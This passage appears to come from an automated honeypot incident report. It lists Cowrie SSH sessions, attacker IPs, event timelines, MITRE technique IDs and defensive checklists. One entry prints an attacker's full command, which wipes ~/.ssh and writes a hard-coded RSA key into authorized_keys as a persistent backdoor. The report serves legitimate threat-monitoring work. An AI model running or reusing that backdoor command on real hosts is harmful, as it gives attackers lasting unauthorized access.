| **First Seen** | 2026-07-30 03:43 |
| **Last Seen** | 2026-07-30 03:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:43:08` | `cowrie.session.connect` |
| `2026-07-30 03:43:08` | `cowrie.login.success` |
| `2026-07-30 03:43:08` | `cowrie.session.params` |
| `2026-07-30 03:43:08` | `cowrie.command.input` |
| `2026-07-30 03:43:08` | `cowrie.command.input` |
| `2026-07-30 03:43:08` | `cowrie.command.failed` |
| `2026-07-30 03:43:08` | `cowrie.command.input` |
| `2026-07-30 03:43:09` | `cowrie.log.closed` |
| `2026-07-30 03:43:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.215[.]120` to AbuseIPDB if not already reported
- [ ] Block `34.38.215[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f4d88d45076

| Field | Detail |
|---|---|
| **Source IP** | `34.38.215[.]120` |
| **First Seen** | 2026-07-30 03:43 |
| **Last Seen** | 2026-07-30 03:43 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:43:21` | `cowrie.session.connect` |
| `2026-07-30 03:43:21` | `cowrie.login.success` |
| `2026-07-30 03:43:22` | `cowrie.session.params` |
| `2026-07-30 03:43:22` | `cowrie.command.input` |
| `2026-07-30 03:43:22` | `cowrie.command.failed` |
| `2026-07-30 03:43:33` | `cowrie.log.closed` |
| `2026-07-30 03:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.215[.]120` to AbuseIPDB if not already reported
- [ ] Block `34.38.215[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f752b0b23d7

| Field | Detail |
|---|---|
| **Source IP** | `34.38.215[.]120` |
| **First Seen** | 2026-07-30 03:43 |
| **Last Seen** | 2026-07-30 03:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:43:23` | `cowrie.session.connect` |
| `2026-07-30 03:43:23` | `cowrie.login.success` |
| `2026-07-30 03:43:24` | `cowrie.session.params` |
| `2026-07-30 03:43:24` | `cowrie.command.input` |
| `2026-07-30 03:43:33` | `cowrie.log.closed` |
| `2026-07-30 03:43:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.38.215[.]120` to AbuseIPDB if not already reported
- [ ] Block `34.38.215[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da5985cff425

| Field | Detail |
|---|---|
| **Source IP** | `221.120.57[.]125` |
| **First Seen** | 2026-07-30 03:44 |
| **Last Seen** | 2026-07-30 03:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:44:47` | `cowrie.session.connect` |
| `2026-07-30 03:44:48` | `cowrie.client.version` |
| `2026-07-30 03:44:48` | `cowrie.client.kex` |
| `2026-07-30 03:44:50` | `cowrie.login.success` |
| `2026-07-30 03:44:51` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.120.57[.]125` to AbuseIPDB if not already reported
- [ ] Block `221.120.57[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10dd8da51fef

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]248` |
| **First Seen** | 2026-07-30 03:48 |
| **Last Seen** | 2026-07-30 03:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:48:10` | `cowrie.session.connect` |
| `2026-07-30 03:48:11` | `cowrie.client.version` |
| `2026-07-30 03:48:11` | `cowrie.client.kex` |
| `2026-07-30 03:48:13` | `cowrie.login.success` |
| `2026-07-30 03:48:14` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]248` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4b56078d07c

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-07-30 03:48 |
| **Last Seen** | 2026-07-30 03:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:48:24` | `cowrie.session.connect` |
| `2026-07-30 03:48:25` | `cowrie.client.version` |
| `2026-07-30 03:48:25` | `cowrie.client.kex` |
| `2026-07-30 03:48:26` | `cowrie.login.success` |
| `2026-07-30 03:48:26` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a330471b4d1c

| Field | Detail |
|---|---|
| **Source IP** | `117.70.94[.]155` |
| **First Seen** | 2026-07-30 03:50 |
| **Last Seen** | 2026-07-30 03:50 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:50:37` | `cowrie.session.connect` |
| `2026-07-30 03:50:38` | `cowrie.client.version` |
| `2026-07-30 03:50:38` | `cowrie.client.kex` |
| `2026-07-30 03:50:42` | `cowrie.login.success` |
| `2026-07-30 03:50:44` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:50:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.70.94[.]155` to AbuseIPDB if not already reported
- [ ] Block `117.70.94[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddacb99f6f70

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-07-30 03:50 |
| **Last Seen** | 2026-07-30 03:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:50:49` | `cowrie.session.connect` |
| `2026-07-30 03:50:49` | `cowrie.client.version` |
| `2026-07-30 03:50:49` | `cowrie.client.kex` |
| `2026-07-30 03:50:51` | `cowrie.login.success` |
| `2026-07-30 03:50:52` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9587233ceeae

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 03:50 |
| **Last Seen** | 2026-07-30 03:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:50:49` | `cowrie.session.connect` |
| `2026-07-30 03:50:49` | `cowrie.client.version` |
| `2026-07-30 03:50:49` | `cowrie.client.kex` |
| `2026-07-30 03:50:49` | `cowrie.login.success` |
| `2026-07-30 03:50:50` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:50:50` | `cowrie.direct-tcpip.data` |
| `2026-07-30 03:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65b16b63d9cb

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-07-30 03:52 |
| **Last Seen** | 2026-07-30 03:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:52:54` | `cowrie.session.connect` |
| `2026-07-30 03:52:55` | `cowrie.client.version` |
| `2026-07-30 03:52:55` | `cowrie.client.kex` |
| `2026-07-30 03:52:57` | `cowrie.login.success` |
| `2026-07-30 03:52:58` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:53:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-963f78dcf946

| Field | Detail |
|---|---|
| **Source IP** | `152.32.239[.]90` |
| **First Seen** | 2026-07-30 03:57 |
| **Last Seen** | 2026-07-30 03:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:57:33` | `cowrie.session.connect` |
| `2026-07-30 03:57:33` | `cowrie.client.version` |
| `2026-07-30 03:57:33` | `cowrie.client.kex` |
| `2026-07-30 03:57:34` | `cowrie.login.success` |
| `2026-07-30 03:57:35` | `cowrie.session.params` |
| `2026-07-30 03:57:35` | `cowrie.command.input` |
| `2026-07-30 03:57:35` | `cowrie.command.failed` |
| `2026-07-30 03:57:36` | `cowrie.log.closed` |
| `2026-07-30 03:57:37` | `cowrie.session.params` |
| `2026-07-30 03:57:37` | `cowrie.command.input` |
| `2026-07-30 03:57:37` | `cowrie.session.file_download` |
| `2026-07-30 03:57:37` | `cowrie.log.closed` |
| `2026-07-30 03:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.239[.]90` to AbuseIPDB if not already reported
- [ ] Block `152.32.239[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cedd14240492

| Field | Detail |
|---|---|
| **Source IP** | `152.32.239[.]90` |
| **First Seen** | 2026-07-30 03:57 |
| **Last Seen** | 2026-07-30 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:57:37` | `cowrie.session.connect` |
| `2026-07-30 03:57:37` | `cowrie.client.version` |
| `2026-07-30 03:57:37` | `cowrie.client.kex` |
| `2026-07-30 03:57:38` | `cowrie.login.success` |
| `2026-07-30 03:57:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.239[.]90` to AbuseIPDB if not already reported
- [ ] Block `152.32.239[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0420ac75d16

| Field | Detail |
|---|---|
| **Source IP** | `152.32.239[.]90` |
| **First Seen** | 2026-07-30 03:57 |
| **Last Seen** | 2026-07-30 03:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:57:39` | `cowrie.session.connect` |
| `2026-07-30 03:57:39` | `cowrie.client.version` |
| `2026-07-30 03:57:39` | `cowrie.client.kex` |
| `2026-07-30 03:57:40` | `cowrie.login.success` |
| `2026-07-30 03:57:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.239[.]90` to AbuseIPDB if not already reported
- [ ] Block `152.32.239[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee118c8e65da

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-07-30 03:58 |
| **Last Seen** | 2026-07-30 03:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:58:21` | `cowrie.session.connect` |
| `2026-07-30 03:58:22` | `cowrie.client.version` |
| `2026-07-30 03:58:22` | `cowrie.client.kex` |
| `2026-07-30 03:58:22` | `cowrie.login.success` |
| `2026-07-30 03:58:23` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d66f5df9349d

| Field | Detail |
|---|---|
| **Source IP** | `65.20.138[.]3` |
| **First Seen** | 2026-07-30 03:58 |
| **Last Seen** | 2026-07-30 03:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 03:58:28` | `cowrie.session.connect` |
| `2026-07-30 03:58:28` | `cowrie.client.version` |
| `2026-07-30 03:58:28` | `cowrie.client.kex` |
| `2026-07-30 03:58:30` | `cowrie.login.success` |
| `2026-07-30 03:58:30` | `cowrie.direct-tcpip.request` |
| `2026-07-30 03:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.138[.]3` to AbuseIPDB if not already reported
- [ ] Block `65.20.138[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667ab5bdda87

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]54` |
| **First Seen** | 2026-07-30 04:06 |
| **Last Seen** | 2026-07-30 04:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:06:30` | `cowrie.session.connect` |
| `2026-07-30 04:06:31` | `cowrie.client.version` |
| `2026-07-30 04:06:31` | `cowrie.client.kex` |
| `2026-07-30 04:06:33` | `cowrie.login.success` |
| `2026-07-30 04:06:34` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:06:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]54` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f43267ead7c

| Field | Detail |
|---|---|
| **Source IP** | `178.214.160[.]4` |
| **First Seen** | 2026-07-30 04:10 |
| **Last Seen** | 2026-07-30 04:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:10:44` | `cowrie.session.connect` |
| `2026-07-30 04:10:44` | `cowrie.client.version` |
| `2026-07-30 04:10:44` | `cowrie.client.kex` |
| `2026-07-30 04:10:46` | `cowrie.login.success` |
| `2026-07-30 04:10:46` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.214.160[.]4` to AbuseIPDB if not already reported
- [ ] Block `178.214.160[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-feab23c5a36d

| Field | Detail |
|---|---|
| **Source IP** | `222.186.68[.]153` |
| **First Seen** | 2026-07-30 04:10 |
| **Last Seen** | 2026-07-30 04:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:10:52` | `cowrie.session.connect` |
| `2026-07-30 04:10:53` | `cowrie.client.version` |
| `2026-07-30 04:10:53` | `cowrie.client.kex` |
| `2026-07-30 04:10:56` | `cowrie.login.success` |
| `2026-07-30 04:10:56` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.186.68[.]153` to AbuseIPDB if not already reported
- [ ] Block `222.186.68[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d857eead43b5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-30 04:17 |
| **Last Seen** | 2026-07-30 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:17:34` | `cowrie.session.connect` |
| `2026-07-30 04:17:34` | `cowrie.client.version` |
| `2026-07-30 04:17:34` | `cowrie.client.kex` |
| `2026-07-30 04:17:34` | `cowrie.login.success` |
| `2026-07-30 04:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f5a2485075

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-30 04:17 |
| **Last Seen** | 2026-07-30 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:17:34` | `cowrie.session.connect` |
| `2026-07-30 04:17:34` | `cowrie.client.version` |
| `2026-07-30 04:17:34` | `cowrie.client.kex` |
| `2026-07-30 04:17:34` | `cowrie.login.success` |
| `2026-07-30 04:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f35488bed81f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-30 04:17 |
| **Last Seen** | 2026-07-30 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:17:36` | `cowrie.session.connect` |
| `2026-07-30 04:17:36` | `cowrie.client.version` |
| `2026-07-30 04:17:36` | `cowrie.client.kex` |
| `2026-07-30 04:17:36` | `cowrie.login.success` |
| `2026-07-30 04:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee71b4578e86

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-30 04:17 |
| **Last Seen** | 2026-07-30 04:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:17:36` | `cowrie.session.connect` |
| `2026-07-30 04:17:36` | `cowrie.client.version` |
| `2026-07-30 04:17:36` | `cowrie.client.kex` |
| `2026-07-30 04:17:36` | `cowrie.login.success` |
| `2026-07-30 04:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88d6a3c1eb3

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]30` |
| **First Seen** | 2026-07-30 04:18 |
| **Last Seen** | 2026-07-30 04:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:18:52` | `cowrie.session.connect` |
| `2026-07-30 04:18:52` | `cowrie.client.version` |
| `2026-07-30 04:18:52` | `cowrie.client.kex` |
| `2026-07-30 04:18:55` | `cowrie.login.success` |
| `2026-07-30 04:18:55` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:19:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]30` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd9df4421c8

| Field | Detail |
|---|---|
| **Source IP** | `87.103.126[.]54` |
| **First Seen** | 2026-07-30 04:19 |
| **Last Seen** | 2026-07-30 04:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:19:00` | `cowrie.session.connect` |
| `2026-07-30 04:19:01` | `cowrie.client.version` |
| `2026-07-30 04:19:01` | `cowrie.client.kex` |
| `2026-07-30 04:19:02` | `cowrie.login.success` |
| `2026-07-30 04:19:02` | `cowrie.direct-tcpip.request` |
| `2026-07-30 04:19:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.103.126[.]54` to AbuseIPDB if not already reported
- [ ] Block `87.103.126[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-835e1d3afe57

| Field | Detail |
|---|---|
| **Source IP** | `34.53.184[.]34` |
| **First Seen** | 2026-07-30 04:22 |
| **Last Seen** | 2026-07-30 04:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:22:18` | `cowrie.session.connect` |
| `2026-07-30 04:22:18` | `cowrie.login.success` |
| `2026-07-30 04:22:19` | `cowrie.session.params` |
| `2026-07-30 04:22:19` | `cowrie.command.input` |
| `2026-07-30 04:22:19` | `cowrie.command.input` |
| `2026-07-30 04:22:19` | `cowrie.command.failed` |
| `2026-07-30 04:22:19` | `cowrie.command.input` |
| `2026-07-30 04:22:19` | `cowrie.log.closed` |
| `2026-07-30 04:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.53.184[.]34` to AbuseIPDB if not already reported
- [ ] Block `34.53.184[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-139ceced730f

| Field | Detail |
|---|---|
| **Source IP** | `34.53.184[.]34` |
| **First Seen** | 2026-07-30 04:22 |
| **Last Seen** | 2026-07-30 04:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 04:22:32` | `cowrie.session.connect` |
| `2026-07-30 04:22:32` | `cowrie.login.success` |
| `2026-07-30 04:22:32` | `cowrie.session.params` |
| `2026-07-30 04:22:32` | `cowrie.command.input` |
| `2026-07-30 04:22:32` | `cowrie.command.failed` |
| `2026-07-30 04:22:39` | `cowrie.log.closed` |
